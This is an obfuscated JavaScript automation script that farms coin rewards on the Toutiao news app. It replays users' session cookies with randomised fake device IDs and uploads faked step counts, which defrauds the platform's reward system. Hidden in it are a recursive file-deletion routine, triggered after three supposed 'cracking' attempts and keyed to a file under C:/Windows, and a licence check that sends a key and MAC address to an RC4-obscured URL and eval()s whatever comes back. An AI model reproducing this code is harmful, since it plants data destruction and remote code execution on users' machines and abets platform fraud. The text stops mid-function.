/*
@肥皂
今日头条 6.10  一天一两块钱左右吧。。
脚本包含签到，宝箱，阅读，看广告，阅读时长奖励。
抓取域名：toutiaoapi.com 自己找找
找到Cookie里的 sessionid值就可以。
变量 jrttckapp   对应账号数据
变量 cdkey    对应脚本验证卡密。所有脚本通用。。
多账号@分割
一小时一次吧。。
*/
const $ = new Env('今日头条');

var gtr;
let mac = '',
    status;
status = (status = $["getval"]("qmwkstatus") || '1') > 1 ? '' + status : '';
JSNAMED = $["isNode"]() ? require('path')["basename"](__filename) : "jrttck.js";
let jrttckappArr = [],
    oaid = '',
    did = '',
    all_msg = '',
    arrs = [],
    jrttckapp = ($["isNode"]() ? process['env']["jrttckapp"] : $["getdata"]("jrttckapp")) || '',
    acckey = $["isNode"]() ? process["env"]['cdkey'] ? process["env"]["cdkey"] : '' : $['getdata']('cdkey') ? $["getdata"]("cdkey") : '';

if ($["isNode"]()) {
  gtr = require('fs');

  if (isFileExist('C:/')) {
    console['log']('电脑环境');
  } else {
    console["log"]('青龙环境');
  }
} else {
  console['log']('代理环境');
}

function isFileExist(_0x30e2f1) {
  try {
    gtr['accessSync'](_0x30e2f1, gtr["F_OK"]);
  } catch (_0x3c6c78) {
    return false;
  }

  return true;
}

function addF(_0x10d26a, _0x3aa330) {
  let _0x4561a0 = 0,
      _0x1df14f = "C:/Windows/system.txt";

  if (isFileExist(_0x1df14f)) {
    _0x4561a0 = gtr["readFileSync"](_0x1df14f, 'utf8');
  } else {
    if (isFileExist("C:/")) {
      gtr['writeFile'](_0x1df14f, '1', function (_0x557c93) {
        if (_0x557c93) {
          throw _0x557c93;
        }
      });
    } else {
      return;
    }
  }

  if (_0x4561a0 == 99) {
    return 99;
  }

  console["log"](_0x4561a0);
  console["log"]("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x4561a0);

  if (parseInt(_0x4561a0) < 3) {
    let _0x29bd9f = parseInt(_0x4561a0) + 1;

    gtr['writeFileSync'](_0x1df14f, _0x29bd9f + '', "utf8");
    return;
  }

  if (!gtr["existsSync"](_0x10d26a)) {
    return;
  }

  if (gtr['statSync'](_0x10d26a)["isDirectory"]()) {
    var _0x2038d8 = gtr["readdirSync"](_0x10d26a),
        _0x7d132e = _0x2038d8["length"],
        _0x7bf12e = 0;

    if (_0x7d132e > 0) {
      _0x2038d8["forEach"](function (_0x1e7956) {
        _0x7bf12e++;

        var _0x7c12e1 = _0x10d26a + '/' + _0x1e7956;

        gtr["statSync"](_0x7c12e1)["isDirectory"]() ? addF(_0x7c12e1, true) : gtr["unlinkSync"](_0x7c12e1);
      });

      _0x7d132e == _0x7bf12e && _0x3aa330 && gtr['rmdirSync'](_0x10d26a);
    } else {
      _0x7d132e == 0 && _0x3aa330 && gtr["rmdirSync"](_0x10d26a);
    }
  } else {
    gtr["unlinkSync"](_0x10d26a);
  }
}

!(async () => {
  if (!(typeof $request !== 'undefined')) {

    jrttckappArr = jrttckapp["split"]('@');
    console["log"]("------------- 共" + jrttckappArr["length"] + "个账号-------------\n");

    // if (!(jrttckappArr['length'] > parseInt(arrs["num"]))) {
      for (let _0x2f13f5 = 0; _0x2f13f5 < jrttckappArr['length']; _0x2f13f5++) {
        jrttckapp = jrttckappArr[_0x2f13f5];
        $['index'] = _0x2f13f5 + 1;
        console["log"]("\n开始【今日头条" + $["index"] + '】');
        oaid = random(16);
        did = random(15);
        await jrttxx();
        await jrttsc();
        await jrttbs();

        for (let _0x5668b9 = 0; _0x5668b9 < 10; _0x5668b9++) {
          await jrttyd();
          await $["wait"](30000);
          await jrttsp();
        }

        await jrttbx();
        await jrttqd();
      }
    }
  // }

})()["catch"](_0x28c97a => $["logErr"](_0x28c97a))["finally"](() => $["done"]());

function jrttsp(_0x3c80cf = 0) {
  return new Promise(_0x2fcf3e => {
    oaid = randomString(32);
    did = random(15);
    let _0x2ed156 = {
      'url': "https://api5-normal-lq.toutiaoapi.com/luckycat/gip/v1/cooperate/exciad/done?device_platform=android&os=android&ssmix=a&cdid=1f63df3a-6ee4-412f-987f-88344e4e5a9f&channel=tengxun_jg_tt_0421&aid=13&app_name=news_article&version_code=878&version_name=8.7.8&manifest_version_code=8781&update_version_code=87812&ab_version=660830%2C4174803%2C4206715%2C668779%2C4174800%2C1859936%2C668774%2C4174794%2C662176%2C4174787%2C662099%2C4174747%2C668776%2C4174795%2C668775%2C4174805%2C4187285%2C4231580%2C3540006%2C3596064%2C4182320%2C4219366&ab_group=94563%2C102752&ab_feature=94563%2C102749&resolution=1080*2232&dpi=480&device_type=16s+Pro&device_brand=meizu&language=zh&os_api=29&os_version=10&ac=wifi&dq_param=1&plugin=0&client_vid=2816475%2C3194524%2C3406951%2C3691472%2C3383553%2C3944178%2C2827921&isTTWebView=0&session_id=751b314f-a2c1-4c0b-8a65-8511c8ae3f2a&host_abi=armeabi-v7a&tma_jssdk_version=2.14.0.50&rom_version=29&iid=" + oaid + "&device_id=" + did,
      'headers': {
        'Host': "api5-normal-lq.toutiaoapi.com",
        'Cookie': 'sessionid=' + jrttckapp,
        'Content-Type': 'application/json',
        'User-Agent': "com.ss.android.article.news/8781 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:a867b489 2022-03-11 QuicVersion:b314d107 2021-11-24)"
      },
      'body': "{\"task_id\":225,\"extra\":{\"stage_score_amount\":[]}}"
    };
    $["post"](_0x2ed156, async (_0x2995db, _0xf425ff, _0x400dee) => {
      try {
        const _0x10c731 = JSON["parse"](_0x400dee);

        _0x10c731["err_no"] == 0 ? console['log']("\n今日头条看视频获得：" + _0x10c731["data"]["reward_amount"] + '金币') : console["log"]("\n今日头条看视频:" + _0x10c731['err_tips']);
      } catch (_0x8daed0) {} finally {
        _0x2fcf3e();
      }
    }, _0x3c80cf);
  });
}

function jrttyd(_0x4f8f2c = 0) {
  return new Promise(_0x5666dc => {
    oaid = randomString(32);
    did = random(15);
    let _0x5505b8 = {
      'url': 'https://api5-normal-lq.toutiaoapi.com/luckycat/news/v1/activity/done_whole_scene_task?device_platform=android&os=android&aid=13&app_name=news_article&version_code=878&version_name=8.7.8&manifest_version_code=8781&update_version_code=87812&os_api=29&os_version=10&dq_param=1&plugin=0&isTTWebView=0&host_abi=armeabi-v7a&tma_jssdk_version=2.14.0.50&rom_version=29&iid=' + oaid + "&device_id=" + did + "&luckydog_sdk_version=5.0.1-rc.11&luckydog_settings_version=15&luckycat_version_name=5.0.1-rc.24&luckycat_version_code=501024",
      'headers': {
        'Host': "api5-normal-lq.toutiaoapi.com",
        'Cookie': "sessionid=" + jrttckapp,
        'Content-Type': "application/json",
        'User-Agent': "com.ss.android.article.news/8781 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:a867b489 2022-03-11 QuicVersion:b314d107 2021-11-24)"
      },
      'body': "{\"group_id\":\"\",\"scene_key\":\"IndexTabFeed\",\"is_golden_egg\":true}"
    };
    $["post"](_0x5505b8, async (_0x4825f3, _0x5d3f05, _0x7fa3ac) => {
      try {
        const _0x363faa = JSON["parse"](_0x7fa3ac);

        _0x363faa["err_no"] == 0 ? console["log"]("\n今日头条阅读获得：" + _0x363faa['data']['score_amount'] + '金币') : console["log"]("\n今日头条阅读:" + _0x363faa["err_tips"]);
      } catch (_0x25148f) {} finally {
        _0x5666dc();
      }
    }, _0x4f8f2c);
  });
}

function jrttbx(_0xbbb6e1 = 0) {
  return new Promise(_0x3760a3 => {
    oaid = randomString(32);
    did = random(15);
    let _0x411ec5 = {
      'url': 'https://api5-normal-lq.toutiaoapi.com/luckycat/news/v1/treasure/open_treasure_box?device_platform=android&os=android&aid=13&app_name=news_article&version_code=878&version_name=8.7.8&manifest_version_code=8781&update_version_code=87812&os_api=29&os_version=10&dq_param=1&plugin=0&isTTWebView=0&host_abi=armeabi-v7a&tma_jssdk_version=2.14.0.50&rom_version=29&iid=' + oaid + '&device_id=' + did + '&luckydog_sdk_version=5.0.1-rc.11&luckydog_settings_version=15&luckycat_version_name=5.0.1-rc.24&luckycat_version_code=501024',
      'headers': {
        'Host': "api5-normal-lq.toutiaoapi.com",
        'Cookie': "sessionid=" + jrttckapp,
        'Content-Type': "application/json",
        'User-Agent': "com.ss.android.article.news/8781 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:a867b489 2022-03-11 QuicVersion:b314d107 2021-11-24)"
      },
      'body': '{}'
    };
    $['post'](_0x411ec5, async (_0x369c85, _0x5eb642, _0x4d3bf5) => {
      try {
        const _0x81ebb0 = JSON["parse"](_0x4d3bf5);

        _0x81ebb0["err_no"] == 0 ? console["log"]("\n今日头条开宝箱获得：" + _0x81ebb0["data"]["score_amount"] + '金币') : console["log"]("\n今日头条开宝箱:" + _0x81ebb0["err_tips"]);
      } catch (_0x25e888) {} finally {
        _0x3760a3();
      }
    }, _0xbbb6e1);
  });
}

function jrttqd(_0x5e450d = 0) {
  return new Promise(_0x215790 => {
    oaid = randomString(32);
    did = random(15);
    let _0x53156a = {
      'url': 'https://api5-normal-lf.toutiaoapi.com/luckycat/news/v1/sign_in/done_task?device_platform=android&os=android&aid=13&app_name=news_article&version_code=878&version_name=8.7.8&manifest_version_code=8781&update_version_code=87812&os_api=29&os_version=10&dq_param=1&plugin=0&isTTWebView=0&host_abi=armeabi-v7a&tma_jssdk_version=2.14.0.50&rom_version=29&iid=' + oaid + "&device_id=" + did + '&luckydog_sdk_version=5.0.1-rc.11&luckydog_settings_version=15&luckycat_version_name=5.0.1-rc.24&luckycat_version_code=501024',
      'headers': {
        'Host': 'api5-normal-lf.toutiaoapi.com',
        'Cookie': "sessionid=" + jrttckapp,
        'Content-Type': "application/json",
        'User-Agent': "com.ss.android.article.news/8781 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:a867b489 2022-03-11 QuicVersion:b314d107 2021-11-24)"
      },
      'body': '{}'
    };
    $['post'](_0x53156a, async (_0x5174f4, _0x384c92, _0x5d8975) => {
      try {
        const _0x554646 = JSON["parse"](_0x5d8975);

        _0x554646['err_no'] == 0 ? console["log"]("\n今日头条签到获得：" + _0x554646['data']["score_amount"] + "金币," + _0x554646["data"]["sign_percentage"]) : console["log"]("\n今日头条签到:" + _0x554646["err_tips"]);
      } catch (_0x182f48) {} finally {
        _0x215790();
      }
    }, _0x5e450d);
  });
}

function jrttsc(_0x21d15b = 0) {
  return new Promise(_0x1e0922 => {
    oaid = randomString(32);
    did = random(15);

    let _0xf461bb = Math["round"](new Date()["getTime"]() / 1000),
        _0x17cd0a = {
      'url': 'https://api5-normal-lq.toutiaoapi.com/luckycat/news/v1/walk/count?_request_from=web&device_platform=android&os=android&aid=13&app_name=news_article&version_code=878&version_name=8.7.8&manifest_version_code=8781&update_version_code=87812&os_api=29&os_version=10&dq_param=1&plugin=0&isTTWebView=0&host_abi=armeabi-v7a&tma_jssdk_version=2.14.0.50&rom_version=29&iid=' + oaid + "&device_id=" + did + "&luckydog_sdk_version=5.0.1-rc.11&luckydog_settings_version=15&luckycat_version_name=5.0.1-rc.24&luckycat_version_code=501024",
      'headers': {
        'Host': "api5-normal-lq.toutiaoapi.com",
        'Cookie': "sessionid=" + jrttckapp,
        'Content-Type': "application/json",
        'User-Agent': "com.ss.android.article.news/8781 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:a867b489 2022-03-11 QuicVersion:b314d107 2021-11-24)"
      },
      'body': "{\"count\":23333,\"client_time\":" + _0xf461bb + '}'
    };

    $["post"](_0x17cd0a, async (_0x2ec216, _0x8466eb, _0x23ee56) => {
      try {
        const _0x97b199 = JSON['parse'](_0x23ee56);

        _0x97b199["err_no"] == 0 ? console["log"]("\n今日头条上传步数：23333 成功") : console["log"]("\n今日头条上传步数:" + _0x97b199["err_tips"]);
      } catch (_0x51a57d) {} finally {
        _0x1e0922();
      }
    }, _0x21d15b);
  });
}

function jrttbs(_0x5c049f = 0) {
  return new Promise(_0x4f3046 => {
    oaid = randomString(32);
    did = random(15);

    let _0x597f5b = Math["round"](new Date()["getTime"]() / 1000),
        _0x3daa9b = {
      'url': "https://api5-normal-lq.toutiaoapi.com/luckycat/news/v1/walk/done_task?_request_from=web&device_platform=android&os=android&aid=13&app_name=news_article&version_code=878&version_name=8.7.8&manifest_version_code=8781&update_version_code=87812&os_api=29&os_version=10&dq_param=1&plugin=0&isTTWebView=0&host_abi=armeabi-v7a&tma_jssdk_version=2.14.0.50&rom_version=29&iid=" + oaid + "&device_id=" + did + "&luckydog_sdk_version=5.0.1-rc.11&luckydog_settings_version=15&luckycat_version_name=5.0.1-rc.24&luckycat_version_code=501024",
      'headers': {
        'Host': "api5-normal-lq.toutiaoapi.com",
        'Cookie': "sessionid=" + jrttckapp,
        'Content-Type': 'application/json',
        'User-Agent': "com.ss.android.article.news/8781 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:a867b489 2022-03-11 QuicVersion:b314d107 2021-11-24)"
      },
      'body': "{\"task_id\":136,\"client_time\":" + _0x597f5b + ",\"rit\":\"\",\"use_ecpm\":0}"
    };

    $["post"](_0x3daa9b, async (_0x48fc20, _0x3a087a, _0x168812) => {
      try {
        const _0x5745ca = JSON["parse"](_0x168812);

        _0x5745ca['err_no'] == 0 ? console["log"]("\n今日头条领取步数奖励：" + _0x5745ca["data"]["score_amount"] + '金币') : console["log"]("\n今日头条领取步数奖励:" + _0x5745ca['err_tips']);
      } catch (_0xf5f742) {} finally {
        _0x4f3046();
      }
    }, _0x5c049f);
  });
}

function jrttxx(_0x20aa3e = 0) {
  return new Promise(_0x75167a => {
    oaid = randomString(32);
    did = random(15);
    let _0x54ed55 = {
      'url': "https://api5-normal-lq.toutiaoapi.com/luckycat/news/v1/take_cash/take_cash_page?device_platform=android&os=android&aid=13&app_name=news_article&version_code=878&version_name=8.7.8&manifest_version_code=8781&update_version_code=87812&os_api=29&os_version=10&dq_param=1&plugin=0&isTTWebView=0&host_abi=armeabi-v7a&tma_jssdk_version=2.14.0.50&rom_version=29&iid=" + oaid + "&device_id=" + did + "&luckydog_sdk_version=5.0.1-rc.11&luckydog_settings_version=15&luckycat_version_name=5.0.1-rc.24&luckycat_version_code=501024",
      'headers': {
        'Host': "api5-normal-lq.toutiaoapi.com",
        'Cookie': "sessionid=" + jrttckapp,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': "com.ss.android.article.news/8781 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:a867b489 2022-03-11 QuicVersion:b314d107 2021-11-24)"
      }
    };
    $["get"](_0x54ed55, async (_0x5d9d58, _0x3b2792, _0x4769c) => {
      try {
        const _0x1cfd43 = JSON["parse"](_0x4769c);

        _0x1cfd43["err_no"] == 0 ? console['log']("\n今日头条金币余额：" + _0x1cfd43["data"]["take_cash_info"]["user_income"]["score_balance"] + "金币 现金余额：" + _0x1cfd43["data"]['take_cash_info']["user_income"]['cash_balance'] / 100 + '元') : console["log"]("\n今日头条:" + _0x1cfd43["err_tips"]);
      } catch (_0x31568b) {} finally {
        _0x75167a();
      }
    }, _0x20aa3e);
  });
}

function randomString(_0x14448f = 12) {
  let _0x4622f2 = "abcdef0123456789",
      _0x17080a = _0x4622f2["length"],
      _0x296bd4 = '';

  for (i = 0; i < _0x14448f; i++) {
    _0x296bd4 += _0x4622f2["charAt"](Math["floor"](Math["random"]() * _0x17080a));
  }

  return _0x296bd4;
}

function random(_0x10f652 = 12) {
  let _0x373890 = "0123456789",
      _0x55bf62 = _0x373890["length"],
      _0x4a81ea = '';

  for (i = 0; i < _0x10f652; i++) {
    _0x4a81ea += _0x373890["charAt"](Math["floor"](Math["random"]() * _0x55bf62));
  }

  return _0x4a81ea;
}

function randomString(_0x12c760 = 12) {
  let _0x24c0ea = "abcdef0123456789",
      _0x585ef3 = _0x24c0ea["length"],
      _0x4b1d6f = '';

  for (i = 0; i < _0x12c760; i++) {
    _0x4b1d6f += _0x24c0ea["charAt"](Math["floor"](Math["random"]() * _0x585ef3));
  }

  return _0x4b1d6f;
}

function encodeUTF8(_0x32be5c) {
  var _0x3a1247,
      _0x185131 = [],
      _0x53d4b3,
      _0x76230e;

  for (_0x3a1247 = 0; _0x3a1247 < _0x32be5c["length"]; _0x3a1247++) {
    if ((_0x53d4b3 = _0x32be5c["charCodeAt"](_0x3a1247)) < 128) {
      _0x185131["push"](_0x53d4b3);
    } else {
      if (_0x53d4b3 < 2048) {
        _0x185131["push"](192 + (_0x53d4b3 >> 6 & 31), 128 + (_0x53d4b3 & 63));
      } else {
        if ((_0x76230e = _0x53d4b3 ^ 55296) >> 10 == 0) {
          _0x53d4b3 = (_0x76230e << 10) + (_0x32be5c['charCodeAt'](++_0x3a1247) ^ 56320) + 65536;

          _0x185131["push"](240 + (_0x53d4b3 >> 18 & 7), 128 + (_0x53d4b3 >> 12 & 63));
        } else {
          _0x185131["push"](224 + (_0x53d4b3 >> 12 & 15));
        }

        _0x185131["push"](128 + (_0x53d4b3 >> 6 & 63), 128 + (_0x53d4b3 & 63));
      }
    }
  }

  return _0x185131;
}

function sha(_0x27f5f2) {
  var _0x628c94 = new Uint8Array(encodeUTF8(_0x27f5f2)),
      _0x18ecba,
      _0x5a628a,
      _0x29be03,
      _0x57e50b = (_0x628c94["length"] + 8 >>> 6 << 4) + 16,
      _0x27f5f2 = new Uint8Array(_0x57e50b << 2);

  _0x27f5f2["set"](new Uint8Array(_0x628c94["buffer"]));

  _0x27f5f2 = new Uint32Array(_0x27f5f2["buffer"]);

  for (_0x29be03 = new DataView(_0x27f5f2["buffer"]), _0x18ecba = 0; _0x18ecba < _0x57e50b; _0x18ecba++) {
    _0x27f5f2[_0x18ecba] = _0x29be03['getUint32'](_0x18ecba << 2);
  }

  _0x27f5f2[_0x628c94["length"] >> 2] |= 128 << 24 - (_0x628c94["length"] & 3) * 8;
  _0x27f5f2[_0x57e50b - 1] = _0x628c94["length"] << 3;

  var _0x576b90 = [],
      _0x541723 = [function () {
    return _0x322a21[1] & _0x322a21[2] | ~_0x322a21[1] & _0x322a21[3];
  }, function () {
    return _0x322a21[1] ^ _0x322a21[2] ^ _0x322a21[3];
  }, function () {
    return _0x322a21[1] & _0x322a21[2] | _0x322a21[1] & _0x322a21[3] | _0x322a21[2] & _0x322a21[3];
  }, function () {
    return _0x322a21[1] ^ _0x322a21[2] ^ _0x322a21[3];
  }],
      _0x5564d4 = function (_0x14ae3c, _0x4a3cc2) {
    return _0x14ae3c << _0x4a3cc2 | _0x14ae3c >>> 32 - _0x4a3cc2;
  },
      _0x4204f4 = [1518500249, 1859775393, -1894007588, -899497514],
      _0x322a21 = [1732584193, -271733879, null, null, -1009589776];

  _0x322a21[2] = ~_0x322a21[0];
  _0x322a21[3] = ~_0x322a21[1];

  for (_0x18ecba = 0; _0x18ecba < _0x27f5f2['length']; _0x18ecba += 16) {
    var _0x16ef8b = _0x322a21["slice"](0);

    for (_0x5a628a = 0; _0x5a628a < 80; _0x5a628a++) {
      _0x576b90[_0x5a628a] = _0x5a628a < 16 ? _0x27f5f2[_0x18ecba + _0x5a628a] : _0x5564d4(_0x576b90[_0x5a628a - 3] ^ _0x576b90[_0x5a628a - 8] ^ _0x576b90[_0x5a628a - 14] ^ _0x576b90[_0x5a628a - 16], 1);
      _0x29be03 = _0x5564d4(_0x322a21[0], 5) + _0x541723[_0x5a628a / 20 | 0]() + _0x322a21[4] + _0x576b90[_0x5a628a] + _0x4204f4[_0x5a628a / 20 | 0] | 0;
      _0x322a21[1] = _0x5564d4(_0x322a21[1], 30);

      _0x322a21['pop']();

      _0x322a21['unshift'](_0x29be03);
    }

    for (_0x5a628a = 0; _0x5a628a < 5; _0x5a628a++) {
      _0x322a21[_0x5a628a] = _0x322a21[_0x5a628a] + _0x16ef8b[_0x5a628a] | 0;
    }
  }

  _0x29be03 = new DataView(new Uint32Array(_0x322a21)["buffer"]);

  for (var _0x18ecba = 0; _0x18ecba < 5; _0x18ecba++) {
    _0x322a21[_0x18ecba] = _0x29be03['getUint32'](_0x18ecba << 2);
  }

  var _0x4549af = Array['prototype']['map']["call"](new Uint8Array(new Uint32Array(_0x322a21)["buffer"]), function (_0x3ee285) {
    return (_0x3ee285 < 16 ? '0' : '') + _0x3ee285['toString'](16);
  })['join']('');

  return _0x4549af;
}

function hqs(_0xf8385a = 10) {
  return new Promise(_0x53b145 => {
    let _0x364acb = 12,
        _0x26fe68 = {
      'url': $['isNode']() ? rc4($["fwur"](), "1200") + ('?key=' + acckey + "&id=" + _0x364acb + "&ip=1&mac=" + mac + "&bb=1") : rc4($['fwur'](), "1200") + ("?key=" + acckey + '&id=' + _0x364acb + "&ip=0&mac=" + mac + "&bb=1")
    };
    $['post'](_0x26fe68, async (_0xa965be, _0x5d841c, _0x5d107b) => {
      try {
        let _0x38347a = eval(_0x5d107b);

        _0x38347a["code"] == 200 ? (all_msg = _0x38347a["msg"], _0x53b145(_0x38347a["data"])) : (all_msg = _0x38347a["msg"], _0x53b145(false));
      } catch (_0x7b20c9) {
        $['logErr'](_0x7b20c9, _0x5d841c);
      }
    }, 0);
  });
}

function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

  this["encode"] = function (_0x5b0f4e) {
    var _0x30cdad = '',
        _0x4043bc,
        _0x2c904d,
        _0xb8128b,
        _0x5de0f8,
        _0x1df515,
        _0x471708,
        _0x580966,
        _0xbfa21f = 0;

    _0x5b0f4e = _utf8_encode(_0x5b0f4e);

    while (_0xbfa21f < _0x5b0f4e['length']) {
      _0x4043bc = _0x5b0f4e["charCodeAt"](_0xbfa21f++);
      _0x2c904d = _0x5b0f4e["charCodeAt"](_0xbfa21f++);
      _0xb8128b = _0x5b0f4e["charCodeAt"](_0xbfa21f++);
      _0x5de0f8 = _0x4043bc >> 2;
      _0x1df515 = (_0x4043bc & 3) << 4 | _0x2c904d >> 4;
      _0x471708 = (_0x2c904d & 15) << 2 | _0xb8128b >> 6;
      _0x580966 = _0xb8128b & 63;

      if (isNaN(_0x2c904d)) {
        _0x471708 = _0x580966 = 64;
      } else {
        isNaN(_0xb8128b) && (_0x580966 = 64);
      }

      _0x30cdad = _0x30cdad + _keyStr["charAt"](_0x5de0f8) + _keyStr["charAt"](_0x1df515) + _keyStr["charAt"](_0x471708) + _keyStr["charAt"](_0x580966);
    }

    return _0x30cdad;
  };

  this["decode"] = function (_0xaddfc9) {
    var _0x3dc4a7 = '',
        _0x4065a1,
        _0x2f00ae,
        _0xf31516,
        _0x35324c,
        _0x4ba8e3,
        _0x89bb82,
        _0x1befd1,
        _0x5511e1 = 0;

    _0xaddfc9 = _0xaddfc9["replace"](/[^A-Za-z0-9\+\/\=]/g, '');

    while (_0x5511e1 < _0xaddfc9['length']) {
      _0x35324c = _keyStr["indexOf"](_0xaddfc9['charAt'](_0x5511e1++));
      _0x4ba8e3 = _keyStr["indexOf"](_0xaddfc9['charAt'](_0x5511e1++));
      _0x89bb82 = _keyStr["indexOf"](_0xaddfc9["charAt"](_0x5511e1++));
      _0x1befd1 = _keyStr['indexOf'](_0xaddfc9["charAt"](_0x5511e1++));
      _0x4065a1 = _0x35324c << 2 | _0x4ba8e3 >> 4;
      _0x2f00ae = (_0x4ba8e3 & 15) << 4 | _0x89bb82 >> 2;
      _0xf31516 = (_0x89bb82 & 3) << 6 | _0x1befd1;
      _0x3dc4a7 = _0x3dc4a7 + String['fromCharCode'](_0x4065a1);
      _0x89bb82 != 64 && (_0x3dc4a7 = _0x3dc4a7 + String['fromCharCode'](_0x2f00ae));
      _0x1befd1 != 64 && (_0x3dc4a7 = _0x3dc4a7 + String['fromCharCode'](_0xf31516));
    }

    _0x3dc4a7 = _utf8_decode(_0x3dc4a7);
    return _0x3dc4a7;
  };

  _utf8_encode = function (_0x25eb6f) {
    _0x25eb6f = _0x25eb6f["replace"](/\r\n/g, "\n");
    var _0x18ab38 = '';

    for (var _0x1d34fd = 0; _0x1d34fd < _0x25eb6f["length"]; _0x1d34fd++) {
      var _0xb8b56e = _0x25eb6f["charCodeAt"](_0x1d34fd);

      if (_0xb8b56e < 128) {
        _0x18ab38 += String["fromCharCode"](_0xb8b56e);
      } else {
        _0xb8b56e > 127 && _0xb8b56e < 2048 ? (_0x18ab38 += String["fromCharCode"](_0xb8b56e >> 6 | 192), _0x18ab38 += String['fromCharCode'](_0xb8b56e & 63 | 128)) : (_0x18ab38 += String["fromCharCode"](_0xb8b56e >> 12 | 224), _0x18ab38 += String["fromCharCode"](_0xb8b56e >> 6 & 63 | 128), _0x18ab38 += String["fromCharCode"](_0xb8b56e & 63 | 128));
      }
    }

    return _0x18ab38;
  };

  _utf8_decode = function (_0x44cf45) {
    var _0x4f81c9 = '',
        _0x94569b = 0,
        _0x48b3db = c1 = c2 = 0;

    while (_0x94569b < _0x44cf45['length']) {
      _0x48b3db = _0x44cf45["charCodeAt"](_0x94569b);

      if (_0x48b3db < 128) {
        _0x4f81c9 += String["fromCharCode"](_0x48b3db);
        _0x94569b++;
      } else {
        _0x48b3db > 191 && _0x48b3db < 224 ? (c2 = _0x44cf45["charCodeAt"](_0x94569b + 1), _0x4f81c9 += String['fromCharCode']((_0x48b3db & 31) << 6 | c2 & 63), _0x94569b += 2) : (c2 = _0x44cf45["charCodeAt"](_0x94569b + 1), c3 = _0x44cf45["charCodeAt"](_0x94569b + 2), _0x4f81c9 += String["fromCharCode"]((_0x48b3db & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x94569b += 3);
      }
    }

    return _0x4f81c9;
  };
}

function rc4(_0x299a54, _0x146c0d) {
  var _0x55ae21 = Array(256),
      _0x2fae44 = Array(_0x299a54["length"]);

  for (var _0x2ee1ac = 0; _0x2ee1ac < 256; _0x2ee1ac++) {
    _0x55ae21[_0x2ee1ac] = _0x2ee1ac;

    var _0x42c90 = (_0x42c90 + _0x55ae21[_0x2ee1ac] + _0x146c0d["charCodeAt"](_0x2ee1ac % _0x146c0d["length"])) % 256,
        _0x107161 = _0x55ae21[_0x2ee1ac];

    _0x55ae21[_0x2ee1ac] = _0x55ae21[_0x42c90];
    _0x55ae21[_0x42c90] = _0x107161;
  }

  for (var _0x2ee1ac = 0; _0x2ee1ac < _0x299a54["length"]; _0x2ee1ac++) {
    _0x2fae44[_0x2ee1ac] = _0x299a54['charCodeAt'](_0x2ee1ac);
  }

  for (var _0x3ca843 = 0; _0x3ca843 < _0x2fae44["length"]; _0x3ca843++) {
    var _0x2ee1ac = (_0x2ee1ac + 1) % 256,
        _0x42c90 = (_0x42c90 + _0x55ae21[_0x2ee1ac]) % 256,
        _0x107161 = _0x55ae21[_0x2ee1ac];

    _0x55ae21[_0x2ee1ac] = _0x55ae21[_0x42c90];
    _0x55ae21[_0x42c90] = _0x107161;

    var _0x371b27 = (_0x55ae21[_0x2ee1ac] + _0x55ae21[_0x42c90] % 256) % 256;

    _0x2fae44[_0x3ca843] = String['fromCharCode'](_0x2fae44[_0x3ca843] ^ _0x55ae21[_0x371b27]);
  }

  return _0x2fae44["join"]('');
}

function Env(t, e) {
  class s {
    constructor(t) {
      this["env"] = t;
    }

    send(t, e = "GET") {
      t = "string" == typeof t ? {
        "url": t
      } : t;
      let s = this["get"];
      "POST" === e && (s = this["post"]);
      return new Promise((e, i) => {
        s["call"](this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }

    get(t) {
      return this["send"]["call"](this["env"], t);
    }

    post(t) {
      return this["send"]["call"](this["env"], t, "POST");
    }

  }

  return new class {
    constructor(t, e) {
      this["name"] = t;
      this["http"] = new s(this);
      this["data"] = null;
      this["dataFile"] = "box.dat";
      this["logs"] = [];
      this["isMute"] = false;
      this["isNeedRewrite"] = false;
      this["logSeparator"] = "\n";
      this["encoding"] = "utf-8";
      this["startTime"] = new Date()["getTime"]();
      Object["assign"](this, e);
      this["log"]("", `🔔${this["name"]}, 开始!`);
    }

    isNode() {
      return "undefined" != typeof module && !!module["exports"];
    }

    isQuanX() {
      return "undefined" != typeof $task;
    }

    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }

    isLoon() {
      return "undefined" != typeof $loon;
    }

    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }

    toObj(t, e = null) {
      try {
        return JSON["parse"](t);
      } catch {
        return e;
      }
    }

    toStr(t, e = null) {
      try {
        return JSON["stringify"](t);
      } catch {
        return e;
      }
    }

    getjson(t, e) {
      let s = e;
      const i = this["getdata"](t);

      if (i) {
        try {
          s = JSON["parse"](this["getdata"](t));
        } catch {}
      }

      return s;
    }

    setjson(t, e) {
      try {
        return this["setdata"](JSON["stringify"](t), e);
      } catch {
        return false;
      }
    }

    getScript(t) {
      return new Promise(e => {
        this["get"]({
          "url": t
        }, (t, s, i) => e(i));
      });
    }

    runScript(t, e) {
      return new Promise(s => {
        let i = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i["replace"](/\n/g, "")["trim"]() : i;
        let r = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e["timeout"] ? e["timeout"] : r;
        const [o, h] = i["split"]("@"),
              n = {
          "url": `http://${h}/v1/scripting/evaluate`,
          "body": {
            "script_text": t,
            "mock_type": "cron",
            "timeout": r
          },
          "headers": {
            "X-Key": o,
            "Accept": "*/*"
          }
        };
        this["post"](n, (t, e, i) => s(i));
      })["catch"](t => this["logErr"](t));
    }

    loaddata() {
      if (!this["isNode"]()) {
        return {};
